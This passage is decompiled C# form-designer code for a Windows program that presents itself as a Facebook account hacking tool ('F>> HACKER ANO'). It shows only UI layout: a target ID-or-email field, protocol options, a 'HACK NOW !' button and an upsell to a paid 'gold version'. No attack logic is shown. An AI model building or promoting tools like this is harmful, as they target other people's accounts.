using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Facebook_HACK_ANO.My;
using Facebook_HACK_ANO.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Facebook_HACK_ANO;

[DesignerGenerated]
public class Form2 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("ReactorTheme1")]
	private ReactorTheme _ReactorTheme1;

	[AccessedThroughProperty("ReactorGroupBox1")]
	private ReactorGroupBox _ReactorGroupBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("ReactorRadioButton3")]
	private ReactorRadioButton _ReactorRadioButton3;

	[AccessedThroughProperty("ReactorRadioButton2")]
	private ReactorRadioButton _ReactorRadioButton2;

	[AccessedThroughProperty("ReactorRadioButton1")]
	private ReactorRadioButton _ReactorRadioButton1;

	[AccessedThroughProperty("ReactorTextBox1")]
	private ReactorTextBox _ReactorTextBox1;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	[AccessedThroughProperty("ReactorComboBox1")]
	private ReactorComboBox _ReactorComboBox1;

	[AccessedThroughProperty("ReactorCheckBox11")]
	private ReactorCheckBox _ReactorCheckBox11;

	[AccessedThroughProperty("ReactorCheckBox8")]
	private ReactorCheckBox _ReactorCheckBox8;

	[AccessedThroughProperty("ReactorCheckBox3")]
	private ReactorCheckBox _ReactorCheckBox3;

	[AccessedThroughProperty("ReactorCheckBox2")]
	private ReactorCheckBox _ReactorCheckBox2;

	[AccessedThroughProperty("ReactorCheckBox1")]
	private ReactorCheckBox _ReactorCheckBox1;

	[AccessedThroughProperty("ReactorButton1")]
	private ReactorButton _ReactorButton1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("Timer5")]
	private Timer _Timer5;

	[AccessedThroughProperty("Timer6")]
	private Timer _Timer6;

	[AccessedThroughProperty("Timer7")]
	private Timer _Timer7;

	[AccessedThroughProperty("Timer8")]
	private Timer _Timer8;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual ReactorTheme ReactorTheme1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorTheme1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ReactorTheme1_Click;
			if (_ReactorTheme1 != null)
			{
				((Control)_ReactorTheme1).remove_Click(eventHandler);
			}
			_ReactorTheme1 = value;
			if (_ReactorTheme1 != null)
			{
				((Control)_ReactorTheme1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ReactorGroupBox ReactorGroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorGroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorGroupBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual ReactorRadioButton ReactorRadioButton3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorRadioButton3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorRadioButton3 = value;
		}
	}

	internal virtual ReactorRadioButton ReactorRadioButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorRadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorRadioButton2 = value;
		}
	}

	internal virtual ReactorRadioButton ReactorRadioButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorRadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorRadioButton1 = value;
		}
	}

	internal virtual ReactorTextBox ReactorTextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorTextBox1 = value;
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox2 = value;
		}
	}

	internal virtual ReactorComboBox ReactorComboBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorComboBox1 = value;
		}
	}

	internal virtual ReactorCheckBox ReactorCheckBox11
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorCheckBox11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorCheckBox11 = value;
		}
	}

	internal virtual ReactorCheckBox ReactorCheckBox8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorCheckBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorCheckBox8 = value;
		}
	}

	internal virtual ReactorCheckBox ReactorCheckBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorCheckBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorCheckBox3 = value;
		}
	}

	internal virtual ReactorCheckBox ReactorCheckBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorCheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorCheckBox2 = value;
		}
	}

	internal virtual ReactorCheckBox ReactorCheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorCheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ReactorCheckBox1 = value;
		}
	}

	internal virtual ReactorButton ReactorButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReactorButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ReactorButton1_Click;
			if (_ReactorButton1 != null)
			{
				((Control)_ReactorButton1).remove_Click(eventHandler);
			}
			_ReactorButton1 = value;
			if (_ReactorButton1 != null)
			{
				((Control)_ReactorButton1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer5_Tick;
			if (_Timer5 != null)
			{
				_Timer5.remove_Tick(eventHandler);
			}
			_Timer5 = value;
			if (_Timer5 != null)
			{
				_Timer5.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			if (_Timer6 != null)
			{
				_Timer6.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			if (_Timer6 != null)
			{
				_Timer6.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			if (_Timer7 != null)
			{
				_Timer7.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			if (_Timer7 != null)
			{
				_Timer7.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer8 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form2()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form2_FormClosed));
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Expected O, but got Unknown
		//IL_0357: Unknown result type (might be due to invalid IL or missing references)
		//IL_0361: Expected O, but got Unknown
		//IL_0808: Unknown result type (might be due to invalid IL or missing references)
		//IL_0812: Expected O, but got Unknown
		//IL_09a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b3: Expected O, but got Unknown
		//IL_0a57: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a61: Expected O, but got Unknown
		//IL_0b05: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b0f: Expected O, but got Unknown
		//IL_0bb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bbc: Expected O, but got Unknown
		//IL_0c5f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c69: Expected O, but got Unknown
		//IL_0cfd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d07: Expected O, but got Unknown
		//IL_0d7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d86: Expected O, but got Unknown
		//IL_0e1d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e27: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		Timer4 = new Timer(components);
		Timer5 = new Timer(components);
		Timer6 = new Timer(components);
		Timer7 = new Timer(components);
		Timer8 = new Timer(components);
		ReactorTheme1 = new ReactorTheme();
		TextBox1 = new TextBox();
		ReactorGroupBox1 = new ReactorGroupBox();
		Label1 = new Label();
		ReactorRadioButton3 = new ReactorRadioButton();
		ReactorRadioButton2 = new ReactorRadioButton();
		ReactorRadioButton1 = new ReactorRadioButton();
		ReactorTextBox1 = new ReactorTextBox();
		PictureBox2 = new PictureBox();
		ReactorComboBox1 = new ReactorComboBox();
		ReactorCheckBox11 = new ReactorCheckBox();
		ReactorCheckBox8 = new ReactorCheckBox();
		ReactorCheckBox3 = new ReactorCheckBox();
		ReactorCheckBox2 = new ReactorCheckBox();
		ReactorCheckBox1 = new ReactorCheckBox();
		ReactorButton1 = new ReactorButton();
		PictureBox1 = new PictureBox();
		ListBox1 = new ListBox();
		((Control)ReactorTheme1).SuspendLayout();
		((Control)ReactorGroupBox1).SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Timer3.set_Interval(7000);
		Timer4.set_Interval(5500);
		Timer5.set_Interval(4000);
		Timer6.set_Interval(7000);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)TextBox1);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorGroupBox1);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorRadioButton3);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorRadioButton2);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorRadioButton1);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorTextBox1);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)PictureBox2);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorComboBox1);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorCheckBox11);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorCheckBox8);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorCheckBox3);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorCheckBox2);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorCheckBox1);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ReactorButton1);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)ReactorTheme1).get_Controls().Add((Control)(object)ListBox1);
		((Control)ReactorTheme1).set_Dock((DockStyle)5);
		((Control)ReactorTheme1).set_Font(new Font("Verdana", 6.75f));
		ReactorTheme reactorTheme = ReactorTheme1;
		Point location = new Point(0, 0);
		((Control)reactorTheme).set_Location(location);
		((Control)ReactorTheme1).set_Name("ReactorTheme1");
		ReactorTheme reactorTheme2 = ReactorTheme1;
		Size size = new Size(543, 536);
		((Control)reactorTheme2).set_Size(size);
		((Control)ReactorTheme1).set_TabIndex(2);
		((Control)ReactorTheme1).set_Text("F>> HACKER ANO");
		((TextBoxBase)TextBox1).set_BackColor(SystemColors.InfoText);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox1).set_ForeColor(SystemColors.Window);
		TextBox textBox = TextBox1;
		location = new Point(121, 224);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		TextBox textBox2 = TextBox1;
		size = new Size(293, 30);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(21);
		TextBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)ReactorGroupBox1).set_BackColor(Color.FromArgb(33, 33, 33));
		((Control)ReactorGroupBox1).get_Controls().Add((Control)(object)Label1);
		ReactorGroupBox reactorGroupBox = ReactorGroupBox1;
		location = new Point(419, 424);
		((Control)reactorGroupBox).set_Location(location);
		((Control)ReactorGroupBox1).set_Name("ReactorGroupBox1");
		ReactorGroupBox reactorGroupBox2 = ReactorGroupBox1;
		size = new Size(109, 100);
		((Control)reactorGroupBox2).set_Size(size);
		((Control)ReactorGroupBox1).set_TabIndex(20);
		((Control)ReactorGroupBox1).set_Text("note");
		((Control)Label1).set_Anchor((AnchorStyles)15);
		Label1.set_AutoSize(true);
		((Control)Label1).set_ForeColor(Color.DodgerBlue);
		Label label = Label1;
		location = new Point(3, 25);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(104, 60);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("The program is free\r\n for a period of a few\r\nIn case Expired\r\nYou can buy \r\ngold version");
		Label1.set_TextAlign((ContentAlignment)2);
		((Control)ReactorRadioButton3).set_BackColor(Color.FromArgb(38, 38, 38));
		ReactorRadioButton3.Checked = false;
		((Control)ReactorRadioButton3).set_ForeColor(Color.White);
		ReactorRadioButton reactorRadioButton = ReactorRadioButton3;
		location = new Point(178, 380);
		((Control)reactorRadioButton).set_Location(location);
		((Control)ReactorRadioButton3).set_Name("ReactorRadioButton3");
		ReactorRadioButton reactorRadioButton2 = ReactorRadioButton3;
		size = new Size(146, 16);
		((Control)reactorRadioButton2).set_Size(size);
		((Control)ReactorRadioButton3).set_TabIndex(19);
		((Control)ReactorRadioButton3).set_Text("UDP");
		((Control)ReactorRadioButton2).set_BackColor(Color.FromArgb(38, 38, 38));
		ReactorRadioButton2.Checked = false;
		((Control)ReactorRadioButton2).set_ForeColor(Color.White);
		ReactorRadioButton reactorRadioButton3 = ReactorRadioButton2;
		location = new Point(178, 402);
		((Control)reactorRadioButton3).set_Location(location);
		((Control)ReactorRadioButton2).set_Name("ReactorRadioButton2");
		ReactorRadioButton reactorRadioButton4 = ReactorRadioButton2;
		size = new Size(146, 16);
		((Control)reactorRadioButton4).set_Size(size);
		((Control)ReactorRadioButton2).set_TabIndex(18);
		((Control)ReactorRadioButton2).set_Text("HTTP");
		((Control)ReactorRadioButton1).set_BackColor(Color.FromArgb(38, 38, 38));
		ReactorRadioButton1.Checked = true;
		((Control)ReactorRadioButton1).set_ForeColor(Color.White);
		ReactorRadioButton reactorRadioButton5 = ReactorRadioButton1;
		location = new Point(178, 358);
		((Control)reactorRadioButton5).set_Location(location);
		((Control)ReactorRadioButton1).set_Name("ReactorRadioButton1");
		ReactorRadioButton reactorRadioButton6 = ReactorRadioButton1;
		size = new Size(146, 16);
		((Control)reactorRadioButton6).set_Size(size);
		((Control)ReactorRadioButton1).set_TabIndex(17);
		((Control)ReactorRadioButton1).set_Text("FTP");
		((Control)ReactorTextBox1).set_BackColor(Color.FromArgb(37, 37, 37));
		((Control)ReactorTextBox1).set_ForeColor(Color.White);
		ReactorTextBox reactorTextBox = ReactorTextBox1;
		location = new Point(167, 424);
		((Control)reactorTextBox).set_Location(location);
		ReactorTextBox1.MaxCharacters = 32767;
		((Control)ReactorTextBox1).set_Name("ReactorTextBox1");
		ReactorTextBox reactorTextBox2 = ReactorTextBox1;
		size = new Size(234, 22);
		((Control)reactorTextBox2).set_Size(size);
		((Control)ReactorTextBox1).set_TabIndex(16);
		((Control)ReactorTextBox1).set_Text(" ~ ID ~ OR~ EMAIL~");
		ReactorTextBox1.TextAlign = (HorizontalAlignment)0;
		ReactorTextBox1.UsePasswordMask = false;
		PictureBox2.set_Image((Image)componentResourceManager.GetObject("PictureBox2.Image"));
		PictureBox pictureBox = PictureBox2;
		location = new Point(12, 34);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox2).set_Name("PictureBox2");
		PictureBox pictureBox2 = PictureBox2;
		size = new Size(519, 192);
		((Control)pictureBox2).set_Size(size);
		PictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox2.set_TabIndex(15);
		PictureBox2.set_TabStop(false);
		((ComboBox)ReactorComboBox1).set_BackColor(Color.FromArgb(45, 45, 45));
		((ComboBox)ReactorComboBox1).set_DrawMode((DrawMode)1);
		((ComboBox)ReactorComboBox1).set_DropDownStyle((ComboBoxStyle)2);
		((ComboBox)ReactorComboBox1).set_ForeColor(Color.White);
		((ListControl)ReactorComboBox1).set_FormattingEnabled(true);
		((ComboBox)ReactorComboBox1).get_Items().AddRange(new object[6] { "URL", "Http", "FTP", "UDP", "RDP", "PORT" });
		ReactorComboBox reactorComboBox = ReactorComboBox1;
		location = new Point(419, 355);
		((Control)reactorComboBox).set_Location(location);
		((Control)ReactorComboBox1).set_Name("ReactorComboBox1");
		ReactorComboBox reactorComboBox2 = ReactorComboBox1;
		size = new Size(121, 19);
		((Control)reactorComboBox2).set_Size(size);
		ReactorComboBox1.StartIndex = 0;
		((Control)ReactorComboBox1).set_TabIndex(14);
		((Control)ReactorCheckBox11).set_BackColor(Color.FromArgb(38, 38, 38));
		ReactorCheckBox11.Checked = false;
		((Control)ReactorCheckBox11).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ReactorCheckBox11).set_ForeColor(Color.White);
		ReactorCheckBox reactorCheckBox = ReactorCheckBox11;
		location = new Point(12, 424);
		((Control)reactorCheckBox).set_Location(location);
		((Control)ReactorCheckBox11).set_Name("ReactorCheckBox11");
		ReactorCheckBox reactorCheckBox2 = ReactorCheckBox11;
		size = new Size(123, 16);
		((Control)reactorCheckBox2).set_Size(size);
		((Control)ReactorCheckBox11).set_TabIndex(13);
		((Control)ReactorCheckBox11).set_Text("ID GEN");
		((Control)ReactorCheckBox8).set_BackColor(Color.FromArgb(38, 38, 38));
		ReactorCheckBox8.Checked = true;
		((Control)ReactorCheckBox8).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ReactorCheckBox8).set_ForeColor(Color.White);
		ReactorCheckBox reactorCheckBox3 = ReactorCheckBox8;
		location = new Point(12, 458);
		((Control)reactorCheckBox3).set_Location(location);
		((Control)ReactorCheckBox8).set_Name("ReactorCheckBox8");
		ReactorCheckBox reactorCheckBox4 = ReactorCheckBox8;
		size = new Size(123, 16);
		((Control)reactorCheckBox4).set_Size(size);
		((Control)ReactorCheckBox8).set_TabIndex(10);
		((Control)ReactorCheckBox8).set_Text("Write cont");
		((Control)ReactorCheckBox3).set_BackColor(Color.FromArgb(38, 38, 38));
		ReactorCheckBox3.Checked = false;
		((Control)ReactorCheckBox3).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ReactorCheckBox3).set_ForeColor(Color.White);
		ReactorCheckBox reactorCheckBox5 = ReactorCheckBox3;
		location = new Point(12, 389);
		((Control)reactorCheckBox5).set_Location(location);
		((Control)ReactorCheckBox3).set_Name("ReactorCheckBox3");
		ReactorCheckBox reactorCheckBox6 = ReactorCheckBox3;
		size = new Size(123, 16);
		((Control)reactorCheckBox6).set_Size(size);
		((Control)ReactorCheckBox3).set_TabIndex(5);
		((Control)ReactorCheckBox3).set_Text("Fuck mass");
		((Control)ReactorCheckBox2).set_BackColor(Color.FromArgb(38, 38, 38));
		ReactorCheckBox2.Checked = false;
		((Control)ReactorCheckBox2).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ReactorCheckBox2).set_ForeColor(Color.White);
		ReactorCheckBox reactorCheckBox7 = ReactorCheckBox2;
		location = new Point(12, 358);
		((Control)reactorCheckBox7).set_Location(location);
		((Control)ReactorCheckBox2).set_Name("ReactorCheckBox2");
		ReactorCheckBox reactorCheckBox8 = ReactorCheckBox2;
		size = new Size(123, 16);
		((Control)reactorCheckBox8).set_Size(size);
		((Control)ReactorCheckBox2).set_TabIndex(4);
		((Control)ReactorCheckBox2).set_Text("Use URl <<");
		((Control)ReactorCheckBox1).set_BackColor(Color.FromArgb(38, 38, 38));
		ReactorCheckBox1.Checked = false;
		((Control)ReactorCheckBox1).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ReactorCheckBox1).set_ForeColor(Color.White);
		ReactorCheckBox reactorCheckBox9 = ReactorCheckBox1;
		location = new Point(12, 490);
		((Control)reactorCheckBox9).set_Location(location);
		((Control)ReactorCheckBox1).set_Name("ReactorCheckBox1");
		ReactorCheckBox reactorCheckBox10 = ReactorCheckBox1;
		size = new Size(123, 16);
		((Control)reactorCheckBox10).set_Size(size);
		((Control)ReactorCheckBox1).set_TabIndex(3);
		((Control)ReactorCheckBox1).set_Text("Send Url");
		((Control)ReactorButton1).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)ReactorButton1).set_Font(new Font("Verdana", 6.75f));
		ReactorButton reactorButton = ReactorButton1;
		location = new Point(167, 472);
		((Control)reactorButton).set_Location(location);
		((Control)ReactorButton1).set_Name("ReactorButton1");
		ReactorButton reactorButton2 = ReactorButton1;
		size = new Size(146, 34);
		((Control)reactorButton2).set_Size(size);
		((Control)ReactorButton1).set_TabIndex(2);
		((Control)ReactorButton1).set_Text("HACK NOW !");
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		PictureBox pictureBox3 = PictureBox1;
		location = new Point(0, 34);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox4 = PictureBox1;
		size = new Size(540, 192);
		((Control)pictureBox4).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		ListBox1.set_BackColor(Color.Black);
		ListBox1.set_BorderStyle((BorderStyle)1);
		ListBox1.set_Font(new Font("Tahoma", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ListBox1.set_ForeColor(Color.Red);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox1.set_ItemHeight(16);
		ListBox listBox = ListBox1;
		location = new Point(12, 254);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(519, 98);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(1);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ActiveCaptionText);
		size = new Size(543, 536);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ReactorTheme1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_Opacity(0.94);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("F>> HACKER ANO");
		((Control)ReactorTheme1).ResumeLayout(false);
